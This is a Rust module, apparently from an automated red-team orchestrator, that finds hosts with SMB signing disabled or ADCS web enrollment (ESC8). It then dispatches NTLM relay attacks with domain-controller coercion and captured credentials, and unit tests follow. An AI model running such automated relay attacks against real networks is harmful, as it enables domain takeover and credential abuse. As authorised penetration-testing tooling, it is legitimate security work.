//! auto_ntlm_relay -- orchestrate NTLM relay attacks when conditions are met.
//!
//! NTLM relay requires two sides: a relay listener (ntlmrelayx) and a coercion
//! trigger (PetitPotam, PrinterBug, scheduled task bots). This module dispatches
//! relay attacks when:
//!
//!   1. SMB signing is disabled on a target (relay destination)
//!   2. An ADCS web enrollment endpoint exists (ESC8 relay target)
//!   3. We have credentials to trigger coercion or a known coercion source
//!
//! The worker agent coordinates ntlmrelayx + coercion within a single task.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Dedup key prefix for relay attacks.
const DEDUP_SET: &str = DEDUP_NTLM_RELAY;

/// Monitors for NTLM relay opportunities and dispatches relay attacks.
/// Interval: 30s.
pub async fn auto_ntlm_relay(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("ntlm_relay") {
            continue;
        }

        let listener = match dispatcher.config.listener_ip.as_deref() {
            Some(ip) => ip.to_string(),
            None => continue,
        };

        let work: Vec<RelayWork> = {
            let state = dispatcher.state.read().await;
            collect_relay_work(&state, &listener)
        };

        for item in work {
            let payload = match &item.relay_type {
                RelayType::SmbToLdap => json!({
                    "technique": "ntlm_relay_ldap",
                    "relay_target": item.relay_target,
                    "listener_ip": item.listener,
                    "coercion_source": item.coercion_source,
                    "credential": {
                        "username": item.credential.username,
                        "password": item.credential.password,
                        "domain": item.credential.domain,
                    },
                }),
                RelayType::Esc8 { ca_name, domain } => json!({
                    "technique": "ntlm_relay_adcs",
                    "relay_target": item.relay_target,
                    "listener_ip": item.listener,
                    "ca_name": ca_name,
                    "domain": domain,
                    "coercion_source": item.coercion_source,
                    "credential": {
                        "username": item.credential.username,
                        "password": item.credential.password,
                        "domain": item.credential.domain,
                    },
                }),
            };

            let priority = dispatcher.effective_priority("ntlm_relay");
            match dispatcher
                .throttled_submit("coercion", "coercion", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        relay_target = %item.relay_target,
                        relay_type = %item.relay_type,
                        "NTLM relay attack dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_SET, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SET, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(relay = %item.relay_target, "NTLM relay task deferred by throttler");
                }
                Err(e) => {
                    warn!(err = %e, relay = %item.relay_target, "Failed to dispatch NTLM relay");
                }
            }
        }
    }
}

/// Collect relay work items from current state.
///
/// Pure logic extracted from `auto_ntlm_relay` so it can be unit-tested without
/// needing a `Dispatcher` or async runtime (beyond state construction).
fn collect_relay_work(
    state: &crate::orchestrator::state::StateInner,
    listener: &str,
) -> Vec<RelayWork> {
    if state.credentials.is_empty() {
        return Vec::new();
    }

    let mut items = Vec::new();

    // Path 1: Relay to hosts with SMB signing disabled → LDAP shadow creds / RBCD
    for vuln in state.discovered_vulnerabilities.values() {
        if vuln.vuln_type.to_lowercase() != "smb_signing_disabled" {
            continue;
        }
        if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
            continue;
        }

        let target_ip = vuln
            .details
            .get("target_ip")
            .or_else(|| vuln.details.get("ip"))
            .and_then(|v| v.as_str())
            .unwrap_or(&vuln.target);

        if target_ip.is_empty() {
            continue;
        }

        let relay_key = format!("smb_relay:{target_ip}");
        if state.is_processed(DEDUP_SET, &relay_key) {
            continue;
        }

        let coercion_source = find_coercion_source(&state.domain_controllers, |ip| {
            state.is_processed(DEDUP_COERCED_DCS, ip)
        });

        let cred = match state.credentials.first() {
            Some(c) => c.clone(),
            None => continue,
        };

        items.push(RelayWork {
            dedup_key: relay_key,
            relay_type: RelayType::SmbToLdap,
            relay_target: target_ip.to_string(),
            coercion_source,
            listener: listener.to_string(),
            credential: cred,
        });
    }

    // Path 2: Relay to ADCS web enrollment (ESC8)
    for vuln in state.discovered_vulnerabilities.values() {
        let vtype = vuln.vuln_type.to_lowercase();
        if vtype != "esc8" && vtype != "adcs_web_enrollment" {
            continue;
        }
        if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
            continue;
        }

        let ca_host = vuln
            .details
            .get("ca_host")
            .or_else(|| vuln.details.get("target_ip"))
            .and_then(|v| v.as_str())
            .unwrap_or(&vuln.target);

        if ca_host.is_empty() {
            continue;
        }

        let relay_key = format!("esc8_relay:{ca_host}");
        if state.is_processed(DEDUP_SET, &relay_key) {
            continue;
        }

        let coercion_source = find_coercion_source(&state.domain_controllers, |ip| {
            state.is_processed(DEDUP_COERCED_DCS, ip)
        });

        let cred = match state.credentials.first() {
            Some(c) => c.clone(),
            None => continue,
        };

        let ca_name = vuln
            .details
            .get("ca_name")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();

        let domain = vuln
            .details
            .get("domain")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();

        items.push(RelayWork {
            dedup_key: relay_key,
            relay_type: RelayType::Esc8 { ca_name, domain },
            relay_target: ca_host.to_string(),
            coercion_source,
            listener: listener.to_string(),
            credential: cred,
        });
    }

    items
}

/// Find the best coercion source (a DC IP we can PetitPotam/PrinterBug).
///
/// Takes the domain_controllers map and a closure to check dedup state,
/// keeping us decoupled from `StateInner`'s module visibility.
fn find_coercion_source(
    domain_controllers: &std::collections::HashMap<String, String>,
    is_processed: impl Fn(&str) -> bool,
) -> Option<String> {
    // Prefer a DC we haven't already coerced
    domain_controllers
        .values()
        .find(|ip| !is_processed(ip))
        .or_else(|| domain_controllers.values().next())
        .cloned()
}

struct RelayWork {
    dedup_key: String,
    relay_type: RelayType,
    relay_target: String,
    coercion_source: Option<String>,
    listener: String,
    credential: ares_core::models::Credential,
}

enum RelayType {
    SmbToLdap,
    Esc8 { ca_name: String, domain: String },
}

impl std::fmt::Display for RelayType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::SmbToLdap => write!(f, "smb_to_ldap"),
            Self::Esc8 { .. } => write!(f, "esc8_adcs"),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    #[test]
    fn relay_type_display() {
        assert_eq!(RelayType::SmbToLdap.to_string(), "smb_to_ldap");
        assert_eq!(
            RelayType::Esc8 {
                ca_name: "CA".into(),
                domain: "contoso.local".into()
            }
            .to_string(),
            "esc8_adcs"
        );
    }

    #[test]
    fn dedup_key_format_smb() {
        let key = format!("smb_relay:{}", "192.168.58.22");
        assert_eq!(key, "smb_relay:192.168.58.22");
    }

    #[test]
    fn dedup_key_format_esc8() {
        let key = format!("esc8_relay:{}", "192.168.58.10");
        assert_eq!(key, "esc8_relay:192.168.58.10");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_SET, "ntlm_relay");
    }

    #[test]
    fn find_coercion_source_prefers_unprocessed() {
        let mut dcs = HashMap::new();
        dcs.insert("contoso.local".into(), "192.168.58.10".into());
        dcs.insert("fabrikam.local".into(), "192.168.58.20".into());

        // First DC already processed, second not
        let result = find_coercion_source(&dcs, |ip| ip == "192.168.58.10");
        assert!(result.is_some());
        assert_eq!(result.unwrap(), "192.168.58.20");
    }

    #[test]
    fn find_coercion_source_falls_back_to_any() {
        let mut dcs = HashMap::new();
        dcs.insert("contoso.local".into(), "192.168.58.10".into());

        // All processed, still returns one
        let result = find_coercion_source(&dcs, |_| true);
        assert!(result.is_some());
        assert_eq!(result.unwrap(), "192.168.58.10");
    }

    #[test]
    fn find_coercion_source_empty_map() {
        let dcs = HashMap::new();
        let result = find_coercion_source(&dcs, |_| false);
        assert!(result.is_none());
    }

    #[test]
    fn esc8_vuln_type_matching() {
        let types = ["esc8", "adcs_web_enrollment", "ESC8", "ADCS_WEB_ENROLLMENT"];
        for t in &types {
            let vtype = t.to_lowercase();
            assert!(
                vtype == "esc8" || vtype == "adcs_web_enrollment",
                "{t} should match"
            );
        }
    }

    #[test]
    fn smb_signing_vuln_type_matching() {
        let vtype = "smb_signing_disabled".to_lowercase();
        assert_eq!(vtype, "smb_signing_disabled");

        let not_smb = "mssql_access".to_lowercase();
        assert_ne!(not_smb, "smb_signing_disabled");
    }

    #[test]
    fn relay_work_construction() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "admin".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };
        let work = RelayWork {
            dedup_key: "smb_relay:192.168.58.22".into(),
            relay_type: RelayType::SmbToLdap,
            relay_target: "192.168.58.22".into(),
            coercion_source: Some("192.168.58.10".into()),
            listener: "192.168.58.100".into(),
            credential: cred.clone(),
        };
        assert_eq!(work.relay_target, "192.168.58.22");
        assert_eq!(work.listener, "192.168.58.100");
        assert_eq!(work.credential.username, "admin");
    }

    #[test]
    fn smb_to_ldap_payload_structure() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "admin".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };
        let payload = json!({
            "technique": "ntlm_relay_ldap",
            "relay_target": "192.168.58.22",
            "listener_ip": "192.168.58.100",
            "coercion_source": "192.168.58.10",
            "credential": {
                "username": cred.username,
                "password": cred.password,
                "domain": cred.domain,
            },
        });
        assert_eq!(payload["technique"], "ntlm_relay_ldap");
        assert_eq!(payload["relay_target"], "192.168.58.22");
        assert_eq!(payload["listener_ip"], "192.168.58.100");
        assert_eq!(payload["credential"]["username"], "admin");
        assert_eq!(payload["credential"]["domain"], "contoso.local");
    }

    #[test]
    fn esc8_payload_structure() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "admin".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };
        let relay_type = RelayType::Esc8 {
            ca_name: "contoso-CA".into(),
            domain: "contoso.local".into(),
        };
        let payload = json!({
            "technique": "ntlm_relay_adcs",
            "relay_target": "192.168.58.10",
            "listener_ip": "192.168.58.100",
            "ca_name": "contoso-CA",
            "domain": "contoso.local",
            "coercion_source": "192.168.58.20",
            "credential": {
                "username": cred.username,
                "password": cred.password,
                "domain": cred.domain,
            },
        });
        assert_eq!(payload["technique"], "ntlm_relay_adcs");
        assert_eq!(payload["ca_name"], "contoso-CA");
        assert_eq!(payload["domain"], "contoso.local");
        assert_eq!(relay_type.to_string(), "esc8_adcs");
    }

    #[test]
    fn target_ip_extraction_from_vuln_details() {
        let details = serde_json::json!({"target_ip": "192.168.58.22", "ip": "192.168.58.23"});
        let fallback = "192.168.58.99";
        let target = details
            .get("target_ip")
            .or_else(|| details.get("ip"))
            .and_then(|v| v.as_str())
            .unwrap_or(fallback);
        assert_eq!(target, "192.168.58.22");
    }

    #[test]
    fn target_ip_fallback_to_ip_field() {
        let details = serde_json::json!({"ip": "192.168.58.23"});
        let fallback = "192.168.58.99";
        let target = details
            .get("target_ip")
            .or_else(|| details.get("ip"))
            .and_then(|v| v.as_str())
            .unwrap_or(fallback);
        assert_eq!(target, "192.168.58.23");
    }

    #[test]
    fn target_ip_fallback_to_vuln_target() {
        let details = serde_json::json!({});
        let fallback = "192.168.58.99";
        let target = details
            .get("target_ip")
            .or_else(|| details.get("ip"))
            .and_then(|v| v.as_str())
            .unwrap_or(fallback);
        assert_eq!(target, "192.168.58.99");
    }

    #[test]
    fn ca_host_extraction_fallback() {
        let details = serde_json::json!({"ca_host": "192.168.58.10"});
        let fallback = "192.168.58.99";
        let ca_host = details
            .get("ca_host")
            .or_else(|| details.get("target_ip"))
            .and_then(|v| v.as_str())
            .unwrap_or(fallback);
        assert_eq!(ca_host, "192.168.58.10");

        let details2 = serde_json::json!({"target_ip": "192.168.58.20"});
        let ca_host2 = details2
            .get("ca_host")
            .or_else(|| details2.get("target_ip"))
            .and_then(|v| v.as_str())
            .unwrap_or(fallback);
        assert_eq!(ca_host2, "192.168.58.20");
    }

    #[test]
    fn ca_name_extraction() {
        let details = serde_json::json!({"ca_name": "contoso-CA"});
        let ca_name = details
            .get("ca_name")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        assert_eq!(ca_name, "contoso-CA");

        let details2 = serde_json::json!({});
        let ca_name2 = details2
            .get("ca_name")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        assert_eq!(ca_name2, "");
    }

    #[test]
    fn find_coercion_source_all_unprocessed() {
        let mut dcs = HashMap::new();
        dcs.insert("contoso.local".into(), "192.168.58.10".into());
        dcs.insert("fabrikam.local".into(), "192.168.58.20".into());

        let result = find_coercion_source(&dcs, |_| false);
        assert!(result.is_some());
    }

    #[test]
    fn relay_type_display_exhaustive() {
        let smb = RelayType::SmbToLdap;
        assert_eq!(format!("{smb}"), "smb_to_ldap");

        let esc8 = RelayType::Esc8 {
            ca_name: String::new(),
            domain: String::new(),
        };
        assert_eq!(format!("{esc8}"), "esc8_adcs");
    }

    // --- collect_relay_work integration tests ---

    use crate::orchestrator::state::SharedState;

    fn make_cred() -> ares_core::models::Credential {
        ares_core::models::Credential {
            id: "c1".into(),
            username: "svcadmin".into(),
            password: "S3cure!Pass".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "kerberoast".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_smb_vuln(id: &str, target_ip: &str) -> ares_core::models::VulnerabilityInfo {
        let mut details = HashMap::new();
        details.insert(
            "target_ip".to_string(),
            serde_json::Value::String(target_ip.to_string()),
        );
        ares_core::models::VulnerabilityInfo {
            vuln_id: id.to_string(),
            vuln_type: "smb_signing_disabled".to_string(),
            target: target_ip.to_string(),
            discovered_by: "scanner".to_string(),
            discovered_at: chrono::Utc::now(),
            details,
            recommended_agent: String::new(),
            priority: 5,
        }
    }

    fn make_esc8_vuln(
        id: &str,
        ca_host: &str,
        ca_name: &str,
        domain: &str,
    ) -> ares_core::models::VulnerabilityInfo {
        let mut details = HashMap::new();
        details.insert(
            "ca_host".to_string(),
            serde_json::Value::String(ca_host.to_string()),
        );
        details.insert(
            "ca_name".to_string(),
            serde_json::Value::String(ca_name.to_string()),
        );
        details.insert(
            "domain".to_string(),
            serde_json::Value::String(domain.to_string()),
        );
        ares_core::models::VulnerabilityInfo {
            vuln_id: id.to_string(),
            vuln_type: "esc8".to_string(),
            target: ca_host.to_string(),
            discovered_by: "scanner".to_string(),
            discovered_at: chrono::Utc::now(),
            details,
            recommended_agent: String::new(),
            priority: 8,
        }
    }

    #[tokio::test]
    async fn collect_relay_work_empty_state() {
        let shared = SharedState::new("test".into());
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert!(work.is_empty(), "empty state should produce no work");
    }

    #[tokio::test]
    async fn collect_relay_work_no_credentials() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.discovered_vulnerabilities
                .insert("v1".into(), make_smb_vuln("v1", "192.168.58.22"));
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert!(work.is_empty(), "no credentials should produce no work");
    }

    #[tokio::test]
    async fn collect_relay_work_smb_signing_disabled() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            s.discovered_vulnerabilities
                .insert("v1".into(), make_smb_vuln("v1", "192.168.58.22"));
            s.domain_controllers
                .insert("contoso.local".into(), "192.168.58.10".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].dedup_key, "smb_relay:192.168.58.22");
        assert_eq!(work[0].relay_target, "192.168.58.22");
        assert_eq!(work[0].listener, "192.168.58.100");
        assert!(matches!(work[0].relay_type, RelayType::SmbToLdap));
        assert_eq!(work[0].coercion_source, Some("192.168.58.10".into()));
        assert_eq!(work[0].credential.username, "svcadmin");
    }

    #[tokio::test]
    async fn collect_relay_work_esc8_vuln() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            s.discovered_vulnerabilities.insert(
                "v2".into(),
                make_esc8_vuln("v2", "192.168.58.30", "contoso-CA", "contoso.local"),
            );
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].dedup_key, "esc8_relay:192.168.58.30");
        assert_eq!(work[0].relay_target, "192.168.58.30");
        match &work[0].relay_type {
            RelayType::Esc8 { ca_name, domain } => {
                assert_eq!(ca_name, "contoso-CA");
                assert_eq!(domain, "contoso.local");
            }
            _ => panic!("expected Esc8 relay type"),
        }
        // No DCs configured → coercion_source is None
        assert!(work[0].coercion_source.is_none());
    }

    #[tokio::test]
    async fn collect_relay_work_skips_already_processed_dedup() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            s.discovered_vulnerabilities
                .insert("v1".into(), make_smb_vuln("v1", "192.168.58.22"));
            // Mark the relay key as already processed
            s.mark_processed(DEDUP_SET, "smb_relay:192.168.58.22".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert!(
            work.is_empty(),
            "already-processed dedup key should be skipped"
        );
    }

    #[tokio::test]
    async fn collect_relay_work_skips_exploited_vulns() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            s.discovered_vulnerabilities
                .insert("v1".into(), make_smb_vuln("v1", "192.168.58.22"));
            s.exploited_vulnerabilities.insert("v1".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert!(work.is_empty(), "exploited vulns should be skipped");
    }

    #[tokio::test]
    async fn collect_relay_work_multiple_vulns() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            s.discovered_vulnerabilities
                .insert("v1".into(), make_smb_vuln("v1", "192.168.58.22"));
            s.discovered_vulnerabilities
                .insert("v2".into(), make_smb_vuln("v2", "192.168.58.23"));
            s.discovered_vulnerabilities.insert(
                "v3".into(),
                make_esc8_vuln("v3", "192.168.58.30", "contoso-CA", "contoso.local"),
            );
            s.domain_controllers
                .insert("contoso.local".into(), "192.168.58.10".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 3, "should produce work for all 3 vulns");

        let smb_count = work
            .iter()
            .filter(|w| matches!(w.relay_type, RelayType::SmbToLdap))
            .count();
        let esc8_count = work
            .iter()
            .filter(|w| matches!(w.relay_type, RelayType::Esc8 { .. }))
            .count();
        assert_eq!(smb_count, 2);
        assert_eq!(esc8_count, 1);
    }

    #[tokio::test]
    async fn collect_relay_work_ignores_unrelated_vuln_types() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            // Add an unrelated vuln type
            let mut details = HashMap::new();
            details.insert(
                "target_ip".to_string(),
                serde_json::Value::String("192.168.58.40".to_string()),
            );
            s.discovered_vulnerabilities.insert(
                "v_unrelated".into(),
                ares_core::models::VulnerabilityInfo {
                    vuln_id: "v_unrelated".into(),
                    vuln_type: "mssql_impersonation".into(),
                    target: "192.168.58.40".into(),
                    discovered_by: "scanner".into(),
                    discovered_at: chrono::Utc::now(),
                    details,
                    recommended_agent: String::new(),
                    priority: 3,
                },
            );
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert!(
            work.is_empty(),
            "unrelated vuln types should not produce work"
        );
    }

    #[tokio::test]
    async fn collect_relay_work_esc8_already_processed() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            s.discovered_vulnerabilities.insert(
                "v2".into(),
                make_esc8_vuln("v2", "192.168.58.30", "contoso-CA", "contoso.local"),
            );
            s.mark_processed(DEDUP_SET, "esc8_relay:192.168.58.30".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert!(work.is_empty(), "already-processed esc8 should be skipped");
    }

    #[tokio::test]
    async fn collect_relay_work_mixed_exploited_and_fresh() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            s.discovered_vulnerabilities
                .insert("v1".into(), make_smb_vuln("v1", "192.168.58.22"));
            s.discovered_vulnerabilities
                .insert("v2".into(), make_smb_vuln("v2", "192.168.58.23"));
            // Only v1 is exploited
            s.exploited_vulnerabilities.insert("v1".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].relay_target, "192.168.58.23");
    }

    #[tokio::test]
    async fn collect_relay_work_coercion_source_prefers_uncoerced_dc() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            s.discovered_vulnerabilities
                .insert("v1".into(), make_smb_vuln("v1", "192.168.58.22"));
            s.domain_controllers
                .insert("contoso.local".into(), "192.168.58.10".into());
            s.domain_controllers
                .insert("fabrikam.local".into(), "192.168.58.20".into());
            // Mark first DC as already coerced
            s.mark_processed(DEDUP_COERCED_DCS, "192.168.58.10".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(
            work[0].coercion_source,
            Some("192.168.58.20".into()),
            "should prefer the uncoerced DC"
        );
    }
}
